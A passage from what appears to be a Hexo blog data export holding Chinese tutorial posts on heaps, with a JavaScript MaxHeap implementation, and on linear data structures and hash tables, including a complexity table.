alt=\"二叉树\"></p>\n<h3 id=\"性质\"><a href=\"#性质\" class=\"headerlink\" title=\"性质\"></a>性质</h3><ul>\n<li>任意节点小于（或大于）它的所有子节点</li>\n<li>堆总是一棵完全树。即除了最底层，其他层的节点都被元素填满，且最底层从左到右填入。</li>\n<li>将根节点最大的堆叫做最大堆或大根堆，根节点最小的堆叫做最小堆或小根堆。</li>\n</ul>\n<p>其中<strong>每个结点</strong>的值都不大于其孩子结点的值，这样的堆称为<strong>小根堆</strong>。<br>其中<strong>每个结点</strong>的值都不小于其孩子结点的值，这样的堆称为<strong>大根堆</strong>。</p>\n<blockquote>\n<p>优先队列也完全可以用堆来实现，操作是一模一样的，例如最大优先队列，无论入队顺序，当前最大的元素优先出队。</p>\n</blockquote>\n<blockquote>\n<p>堆的根节点中存放的是最大或者最小元素，但是其他节点的排序顺序是未知的。例如，在一个最大堆中，最大的那一个元素总是位于 index 0 的位置，但是最小的元素则未必是最后一个元素。唯一能够保证的是最小的元素是一个叶节点，但是不确定是哪一个。</p>\n</blockquote>\n<h3 id=\"作用\"><a href=\"#作用\" class=\"headerlink\" title=\"作用\"></a>作用</h3><ul>\n<li>构建优先队列</li>\n<li>堆排序</li>\n<li>快速找出最大/最小值</li>\n</ul>\n<h3 id=\"实现大根堆\"><a href=\"#实现大根堆\" class=\"headerlink\" title=\"实现大根堆\"></a>实现大根堆</h3><p>堆的每个节点的左边子节点索引是 <code>i * 2 + 1</code>，右边是 <code>i * 2 + 2</code>，父节点是 <code>(i - 1) /2</code>。</p>\n<p>堆有两个核心的操作，分别是 <code>shiftUp</code> 和 <code>shiftDown</code>。</p>\n<ul>\n<li><code>shiftUp</code>：添加元素，核心思路是一路将节点与父节点对比大小，如果比父节点大，就和父节点交换位置。</li>\n<li><code>shiftDown</code>：删除根节点，核心思路是先将根节点和末尾交换位置，然后移除末尾元素。接下来循环判断父节点和两个子节点的大小，如果子节点大，就把最大的子节点和父节点交换。</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MaxHeap</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">constructor</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.heap = []</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">size</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.heap.length</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">empty</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.size() == <span class=\"number\">0</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">add</span>(<span class=\"params\">item</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.heap.push(item)</span><br><span class=\"line\">    <span class=\"built_in\">this</span>._shiftUp(<span class=\"built_in\">this</span>.size() - <span class=\"number\">1</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">removeMax</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>._shiftDown(<span class=\"number\">0</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">getParentIndex</span>(<span class=\"params\">k</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">parseInt</span>((k - <span class=\"number\">1</span>) / <span class=\"number\">2</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">getLeftIndex</span>(<span class=\"params\">k</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> k * <span class=\"number\">2</span> + <span class=\"number\">1</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">_shiftUp</span>(<span class=\"params\">k</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 如果当前节点比父节点大，就交换</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"built_in\">this</span>.heap[k] &gt; <span class=\"built_in\">this</span>.heap[<span class=\"built_in\">this</span>.getParentIndex(k)]) &#123;</span><br><span class=\"line\">      <span class=\"built_in\">this</span>._swap(k, <span class=\"built_in\">this</span>.getParentIndex(k))</span><br><span class=\"line\">      <span class=\"comment\">// 将索引变成父节点</span></span><br><span class=\"line\">      k = <span class=\"built_in\">this</span>.getParentIndex(k)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">_shiftDown</span>(<span class=\"params\">k</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 交换首位并删除末尾</span></span><br><span class=\"line\">    <span class=\"built_in\">this</span>._swap(k, <span class=\"built_in\">this</span>.size() - <span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.heap.splice(<span class=\"built_in\">this</span>.size() - <span class=\"number\">1</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"comment\">// 判断节点是否有左孩子，因为二叉堆的特性，有右必有左</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"built_in\">this</span>.getLeftIndex(k) &lt; <span class=\"built_in\">this</span>.size()) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> j = <span class=\"built_in\">this</span>.getLeftIndex(k)</span><br><span class=\"line\">      <span class=\"comment\">// 判断是否有右孩子，并且右孩子是否大于左孩子</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (j + <span class=\"number\">1</span> &lt; <span class=\"built_in\">this</span>.size() &amp;&amp; <span class=\"built_in\">this</span>.heap[j + <span class=\"number\">1</span>] &gt; <span class=\"built_in\">this</span>.heap[j]) j++</span><br><span class=\"line\">      <span class=\"comment\">// 判断父节点是否已经比子节点都大</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"built_in\">this</span>.heap[k] &gt;= <span class=\"built_in\">this</span>.heap[j]) <span class=\"keyword\">break</span></span><br><span class=\"line\">      <span class=\"built_in\">this</span>._swap(k, j)</span><br><span class=\"line\">      k = j</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">_swap</span>(<span class=\"params\">left, right</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> rightValue = <span class=\"built_in\">this</span>.heap[right]</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.heap[right] = <span class=\"built_in\">this</span>.heap[left]</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.heap[left] = rightValue</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"堆\"><a href=\"#堆\" class=\"headerlink\" title=\"堆\"></a>堆</h1><h3 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h3><p>堆通常是一个可以被看做一棵树的数组对象，堆的实现通过构造<strong>二叉堆</strong>，为二叉树的一种。</p>\n<p>逻辑结构为二叉树，存储结构为数组</p>\n<p><img src=\"/images/binary-tree.png\" alt=\"二叉树\"></p>\n<h3 id=\"性质\"><a href=\"#性质\" class=\"headerlink\" title=\"性质\"></a>性质</h3><ul>\n<li>任意节点小于（或大于）它的所有子节点</li>\n<li>堆总是一棵完全树。即除了最底层，其他层的节点都被元素填满，且最底层从左到右填入。</li>\n<li>将根节点最大的堆叫做最大堆或大根堆，根节点最小的堆叫做最小堆或小根堆。</li>\n</ul>\n<p>其中<strong>每个结点</strong>的值都不大于其孩子结点的值，这样的堆称为<strong>小根堆</strong>。<br>其中<strong>每个结点</strong>的值都不小于其孩子结点的值，这样的堆称为<strong>大根堆</strong>。</p>\n<blockquote>\n<p>优先队列也完全可以用堆来实现，操作是一模一样的，例如最大优先队列，无论入队顺序，当前最大的元素优先出队。</p>\n</blockquote>\n<blockquote>\n<p>堆的根节点中存放的是最大或者最小元素，但是其他节点的排序顺序是未知的。例如，在一个最大堆中，最大的那一个元素总是位于 index 0 的位置，但是最小的元素则未必是最后一个元素。唯一能够保证的是最小的元素是一个叶节点，但是不确定是哪一个。</p>\n</blockquote>\n<h3 id=\"作用\"><a href=\"#作用\" class=\"headerlink\" title=\"作用\"></a>作用</h3><ul>\n<li>构建优先队列</li>\n<li>堆排序</li>\n<li>快速找出最大/最小值</li>\n</ul>\n<h3 id=\"实现大根堆\"><a href=\"#实现大根堆\" class=\"headerlink\" title=\"实现大根堆\"></a>实现大根堆</h3><p>堆的每个节点的左边子节点索引是 <code>i * 2 + 1</code>，右边是 <code>i * 2 + 2</code>，父节点是 <code>(i - 1) /2</code>。</p>\n<p>堆有两个核心的操作，分别是 <code>shiftUp</code> 和 <code>shiftDown</code>。</p>\n<ul>\n<li><code>shiftUp</code>：添加元素，核心思路是一路将节点与父节点对比大小，如果比父节点大，就和父节点交换位置。</li>\n<li><code>shiftDown</code>：删除根节点，核心思路是先将根节点和末尾交换位置，然后移除末尾元素。接下来循环判断父节点和两个子节点的大小，如果子节点大，就把最大的子节点和父节点交换。</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MaxHeap</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">constructor</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.heap = []</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">size</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.heap.length</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">empty</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.size() == <span class=\"number\">0</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">add</span>(<span class=\"params\">item</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.heap.push(item)</span><br><span class=\"line\">    <span class=\"built_in\">this</span>._shiftUp(<span class=\"built_in\">this</span>.size() - <span class=\"number\">1</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">removeMax</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>._shiftDown(<span class=\"number\">0</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">getParentIndex</span>(<span class=\"params\">k</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">parseInt</span>((k - <span class=\"number\">1</span>) / <span class=\"number\">2</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">getLeftIndex</span>(<span class=\"params\">k</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> k * <span class=\"number\">2</span> + <span class=\"number\">1</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">_shiftUp</span>(<span class=\"params\">k</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 如果当前节点比父节点大，就交换</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"built_in\">this</span>.heap[k] &gt; <span class=\"built_in\">this</span>.heap[<span class=\"built_in\">this</span>.getParentIndex(k)]) &#123;</span><br><span class=\"line\">      <span class=\"built_in\">this</span>._swap(k, <span class=\"built_in\">this</span>.getParentIndex(k))</span><br><span class=\"line\">      <span class=\"comment\">// 将索引变成父节点</span></span><br><span class=\"line\">      k = <span class=\"built_in\">this</span>.getParentIndex(k)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">_shiftDown</span>(<span class=\"params\">k</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 交换首位并删除末尾</span></span><br><span class=\"line\">    <span class=\"built_in\">this</span>._swap(k, <span class=\"built_in\">this</span>.size() - <span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.heap.splice(<span class=\"built_in\">this</span>.size() - <span class=\"number\">1</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"comment\">// 判断节点是否有左孩子，因为二叉堆的特性，有右必有左</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"built_in\">this</span>.getLeftIndex(k) &lt; <span class=\"built_in\">this</span>.size()) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> j = <span class=\"built_in\">this</span>.getLeftIndex(k)</span><br><span class=\"line\">      <span class=\"comment\">// 判断是否有右孩子，并且右孩子是否大于左孩子</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (j + <span class=\"number\">1</span> &lt; <span class=\"built_in\">this</span>.size() &amp;&amp; <span class=\"built_in\">this</span>.heap[j + <span class=\"number\">1</span>] &gt; <span class=\"built_in\">this</span>.heap[j]) j++</span><br><span class=\"line\">      <span class=\"comment\">// 判断父节点是否已经比子节点都大</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"built_in\">this</span>.heap[k] &gt;= <span class=\"built_in\">this</span>.heap[j]) <span class=\"keyword\">break</span></span><br><span class=\"line\">      <span class=\"built_in\">this</span>._swap(k, j)</span><br><span class=\"line\">      k = j</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">_swap</span>(<span class=\"params\">left, right</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> rightValue = <span class=\"built_in\">this</span>.heap[right]</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.heap[right] = <span class=\"built_in\">this</span>.heap[left]</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.heap[left] = rightValue</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"常用线性结构","date":"2020-11-14T07:48:00.000Z","_content":"\n# 数据结构-常用(线性结构)\n\n数据结构按照逻辑结构来分类，可分为 **线性结构** 和 **非线性结构**\n\n* 线性结构：数组、链表、栈、队列、串等\n* 非线性结构：多维数组、树、图等\n\n## 数组（Array）\n\n存储方式：在内存中占用连续完整的存储空间，最基本的存储结构之一\n适用场景：适用于读操作多，写操作少\n\n## 链表（Linked List）\n\n存储方式：在内存中占用非连续完整的存储空间，物理上是非连续、非顺序的，最基本的存储结构之一\n适用场景：适用于读操作少，写操作多\n\n#### 双向链表（Doubly Linked List）\n\n**双向链表**是链表的一种，它的每个数据结点中都有两个指针，分别指向直接后继和直接前驱\n\n## 栈（Stack）\n\n特点：后进先出，有 **入栈（push）** 和 **出栈（pop）** 操作，可用数组或链表实现\n\n## 队列（Queue）\n\n特点：先进先出，有 **入队（push）** 和 **出队（pop）** 操作，可用数组或链表实现\n\n> 双端队列：可以同时重队头或队尾执行 **入队（push）** 和 **出队（pop）** 操作\n\n## 散列表（Hash Table）\n\n散列表也叫哈希表（hash table），这种数据结构提供了**键（Key）**和**值（value）**的映射关系，只要提供 **Key**，便可高效查找出所匹配的 **Value**，时间复杂度**接近**于为 `O(1)`，基于数组实现，查找快速\n\n#### 哈希函数\n\n哈希函数是一种映射关系，根据数据的关键词 **Key** ，通过一定的函数关系，计算出该元素存储位置的函数\n\n> 哈希函数是将字符串或其他类型的 **Key** 转换成数组的下标 **index**\n\n实现方式：\n* 直接定址法：取关键字或关键字的某个线性函数值为散列地址，即 H(key) = key 或 H(key) = a*key + b\n* 除留余数法：取关键字被某个不大于散列表长度 m 的数 p 求余，得到的作为散列地址，即 H(key) = key % p, p < m\n* 位运算hash: 通过利用各种位运算（常见的是移位和异或）来充分的混合输入元素\n* 平方取中法：先计算出关键字值的平方，然后取平方值中间几位作为散列地址\n* 数字分析法：当关键字的位数大于地址的位数，对关键字的各位分布进行分析，选出分布均匀的任意几位作为散列地址\n* 随机数法：选择一个随机函数，把关键字的随机函数值作为它的哈希值\n\n#### 哈希冲突\n\n对应不同的关键字可能获得相同的 hash 地址，即 `key1≠key2`，但是 `f(key1)=f(key2)`。这种现象就是冲突，而且这种冲突只能尽可能的减少，不能完全避免。因为哈希函数是从关键字集合和地址集合的映像，通常关键字集合比较大，而地址集合的元素仅为哈希表中的地址值。\n\n##### a. 开放地址法\n**开放地址法**是当冲突发生时，使用某种探测技术在散列表中形成一个探测序列。沿此序列逐个单元地查找，直到找到给定的关键字，或者碰到一个开放的地址（即该地址单元为空）为止（若要插入，在探查到开放的地址，则可将待插入的新结点存人该地址单元）。查找时探测到开放的地址则表明表中无待查的关键字，即查找失败\n\n\n> 当冲突发生时，使用某种探查(亦称探测)技术在散列表中寻找下一个空的散列地址，只要散列表足够大，空的散列地址总能找到\n\n##### b. 二次哈希法\n\n再使用一个哈希函数，对产生地址冲突的关键字再次进行哈希计算，获取另一个哈希地址，直到不再产生冲突，这种方法不易产生“二次聚集”，但是增加的计算的时间。\n\n##### c. 链地址法\n\n每个哈希地址对应的一个线性表，将地址相同的记录按序写入链表，这种处理方法如果收到哈希共计，出现大量的哈希冲突，会导致查询的时间复杂度增长，甚至退化为O(n)，为了提高查询效率我们可以使用跳表或者红黑树等结构替换线性表\n\n### 各数据结构时间复杂度比较\n| 分类 | 读取 | 更新 | 插入 | 删除 |\n| --- | --- | --- | --- | --- |\n| 数组 | O(1) | O(1) | O(n) | O(n) |\n| 链表 | O(n) | O(1) | O(1) | O(1) |\n| 栈 | O(1) | O(1) | O(1) | O(1) |\n| 队列 | O(1) | O(1) | O(1) | O(1) |\n| 散列表 | O(1) | O(1) | O(1) | O(1) |\n\n","source":"_posts/数据结构/数据结构-常用(线性结构).md","raw":"---\ntitle: 常用线性结构\ncategories: 数据结构\ntags: [数据结构]\ndate: 2020-11-14 15:48:00\n---\n\n# 数据结构-常用(线性结构)\n\n数据结构按照逻辑结构来分类，可分为 **线性结构** 和 **非线性结构**\n\n* 线性结构：数组、链表、栈、队列、串等\n* 非线性结构：多维数组、树、图等\n\n## 数组（Array）\n\n存储方式：在内存中占用连续完整的存储空间，最基本的存储结构之一\n适用场景：适用于读操作多，写操作少\n\n## 链表（Linked List）\n\n存储方式：在内存中占用非连续完整的存储空间，物理上是非连续、非顺序的，最基本的存储结构之一\n适用场景：适用于读操作少，写操作多\n\n#### 双向链表（Doubly Linked List）\n\n**双向链表**是链表的一种，它的每个数据结点中都有两个指针，分别指向直接后继和直接前驱\n\n## 栈（Stack）\n\n特点：后进先出，有 **入栈（push）** 和 **出栈（pop）** 操作，可用数组或链表实现\n\n## 队列（Queue）\n\n特点：先进先出，有 **入队（push）** 和 **出队（pop）** 操作，可用数组或链表实现\n\n> 双端队列：可以同时重队头或队尾执行 **入队（push）** 和 **出队（pop）** 操作\n\n## 散列表（Hash Table）\n\n散列表也叫哈希表（hash table），这种数据结构提供了**键（Key）**和**值（value）**的映射关系，只要提供 **Key**，便可高效查找出所匹配的 **Value**，时间复杂度**接近**于为 `O(1)`，基于数组实现，查找快速\n\n#### 哈希函数\n\n哈希函数是一种映射关系，根据数据的关键词 **Key** ，通过一定的函数关系，计算出该元素存储位置的函数\n\n> 哈希函数是将字符串或其他类型的 **Key** 转换成数组的下标 **index**\n\n实现方式：\n* 直接定址法：取关键字或关键字的某个线性函数值为散列地址，即 H(key) = key 或 H(key) = a*key + b\n* 除留余数法：取关键字被某个不大于散列表长度 m 的数 p 求余，得到的作为散列地址，即 H(key) = key % p, p < m\n* 位运算hash: 通过利用各种位运算（常见的是移位和异或）来充分的混合输入元素\n* 平方取中法：先计算出关键字值的平方，然后取平方值中间几位作为散列地址\n* 数字分析法：当关键字的位数大于地址的位数，对关键字的各位分布进行分析，选出分布均匀的任意几位作为散列地址\n* 随机数法：选择一个随机函数，把关键字的随机函数值作为它的哈希值\n\n#### 哈希冲突\n\n对应不同的关键字可能获得相同的 hash 地址，即 `key1≠key2`，但是 `f(key1)=f(key2)`。这种现象就是冲突，而且这种冲突只能尽可能的减少，不能完全避免。因为哈希函数是从关键字集合和地址集合的映像，通常关键字集合比较大，而地址集合的元素仅为哈希表中的地址值。\n\n##### a. 开放地址法\n**开放地址法**是当冲突发生时，使用某种探测技术在散列表中形成一个探测序列。沿此序列逐个单元地查找，直到找到给定的关键字，或者碰到一个开放的地址（即该地址单元为空）为止（若要插入，在探查到开放的地址，则可将待插入的新结点存人该地址单元）。查找时探测到开放的地址则表明表中无待查的关键字，即查找失败\n\n\n> 当冲突发生时，使用某种探查(亦称探测)技术在散列表中寻找下一个空的散列地址，只要散列表足够大，空的散列地址总能找到\n\n##### b. 二次哈希法\n\n再使用一个哈希函数，对产生地址冲突的关键字再次进行哈希计算，获取另一个哈希地址，直到不再产生冲突，这种方法不易产生“二次聚集”，但是增加的计算的时间。\n\n##### c. 链地址法\n\n每个哈希地址对应的一个线性表，将地址相同的记录按序写入链表，这种处理方法如果收到哈希共计，出现大量的哈希冲突，会导致查询的时间复杂度增长，甚至退化为O(n)，为了提高查询效率我们可以使用跳表或者红黑树等结构替换线性表\n\n### 各数据结构时间复杂度比较\n| 分类 | 读取 | 更新 | 插入 | 删除 |\n| --- | --- | --- | --- | --- |\n| 数组 | O(1) | O(1) | O(n) | O(n) |\n| 链表 | O(n) | O(1) | O(1) | O(1) |\n| 栈 | O(1) | O(1) | O(1) | O(1) |\n| 队列 | O(1) | O(1) | O(1) | O(1) |\n| 散列表 | O(1) | O(1) | O(1) | O(1) |\n\n","slug":"数据结构/数据结构-常用(线性结构)","published":1,"updated":"2021-05-03T09:22:42.828Z","_id":"cko8e8tcn0002qf6r5scl0vq1","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"数据结构-常用-线性结构\"><a href=\"#数据结构-常用-线性结构\" class=\"headerlink\" title=\"数据结构-常用(线性结构)\"></a>数据结构-常用(线性结构)</h1><p>数据结构按照逻辑结构来分类，可分为 <strong>线性结构</strong> 和 <strong>非线性结构</strong></p>\n<ul>\n<li>线性结构：数组、链表、栈、队列、串等</li>\n<li>非线性结构：多维数组、树、图等</li>\n</ul>\n<h2 id=\"数组（Array）\"><a href=\"#数组（Array）\" class=\"headerlink\" title=\"数组（Array）\"></a>数组（Array）</h2><p>存储方式：在内存中占用连续完整的存储空间，最基本的存储结构之一<br>适用场景：适用于读操作多，写操作少</p>\n<h2 id=\"链表（Linked-List）\"><a href=\"#链表（Linked-List）\" class=\"headerlink\" title=\"链表（Linked List）\"></a>链表（Linked List）</h2><p>存储方式：在内存中占用非连续完整的存储空间，物理上是非连续、非顺序的，最基本的存储结构之一<br>适用场景：适用于读操作少，写操作多</p>\n<h4 id=\"双向链表（Doubly-Linked-List）\"><a href=\"#双向链表（Doubly-Linked-List）\" class=\"headerlink\" title=\"双向链表（Doubly Linked List）\"></a>双向链表（Doubly Linked List）</h4><p><strong>双向链表</strong>是链表的一种，它的每个数据结点中都有两个指针，分别指向直接后继和直接前驱</p>\n<h2 id=\"栈（Stack）\"><a href=\"#栈（Stack）\" class=\"headerlink\" title=\"栈（Stack）\"></a>栈（Stack）</h2><p>特点：后进先出，有 <strong>入栈（push）</strong> 和 <strong>出栈（pop）</strong> 操作，可用数组或链表实现</p>\n<h2 id=\"队列（Queue）\"><a href=\"#队列（Queue）\" class=\"headerlink\" title=\"队列（Queue）\"></a>队列（Queue）</h2><p>特点：先进先出，有 <strong>入队（push）</strong> 和 <strong>出队（pop）</strong> 操作，可用数组或链表实现</p>\n<blockquote>\n<p>双端队列：可以同时重队头或队尾执行 <strong>入队（push）</strong> 和 <strong>出队（pop）</strong> 操作</p>\n</blockquote>\n<h2 id=\"散列表（Hash-Table）\"><a href=\"#散列表（Hash-Table）\" class=\"headerlink\" title=\"散列表（Hash Table）\"></a>散列表（Hash Table）</h2><p>散列表也叫哈希表（hash table），这种数据结构提供了<strong>键（Key）</strong>和<strong>值（value）</strong>的映射关系，只要提供 <strong>Key</strong>，便可高效查找出所匹配的 <strong>Value</strong>，时间复杂度<strong>接近</strong>于为 <code>O(1)</code>，基于数组实现，查找快速</p>\n<h4 id=\"哈希函数\"><a href=\"#哈希函数\" class=\"headerlink\" title=\"哈希函数\"></a>哈希函数</h4><p>哈希函数是一种映射关系，根据数据的关键词 <strong>Key</strong> ，通过一定的函数关系，计算出该元素存储位置的函数</p>\n<blockquote>\n<p>哈希函数是将字符串或其他类型的 <strong>Key</strong> 转换成数组的下标 <strong>index</strong></p>\n</blockquote>\n<p>实现方式：</p>\n<ul>\n<li>直接定址法：取关键字或关键字的某个线性函数值为散列地址，即 H(key) = key 或 H(key) = a*key + b</li>\n<li>除留余数法：取关键字被某个不大于散列表长度 m 的数 p 求余，得到的作为散列地址，即 H(key) = key % p, p &lt; m</li>\n<li>位运算hash: 通过利用各种位运算（常见的是移位和异或）来充分的混合输入元素</li>\n<li>平方取中法：先计算出关键字值的平方，然后取平方值中间几位作为散列地址</li>\n<li>数字分析法：当关键字的位数大于地址的位数，对关键字的各位分布进行分析，选出分布均匀的任意几位作为散列地址</li>\n<li>随机数法：选择一个随机函数，把关键字的随机函数值作为它的哈希值</li>\n</ul>\n<h4 id=\"哈希冲突\"><a href=\"#哈希冲突\" class=\"headerlink\" title=\"哈希冲突\"></a>哈希冲突</h4><p>对应不同的关键字可能获得相同的 hash 地址，即 <code>key1≠key2</code>，但是 <code>f(key1)=f(key2)</code>。这种现象就是冲突，而且这种冲突只能尽可能的减少，不能完全避免。因为哈希函数是从关键字集合和地址集合的映像，通常关键字集合比较大，而地址集合的元素仅为哈希表中的地址值。</p>\n<h5 id=\"a-开放地址法\"><a href=\"#a-开放地址法\" class=\"headerlink\" title=\"a. 开放地址法\"></a>a. 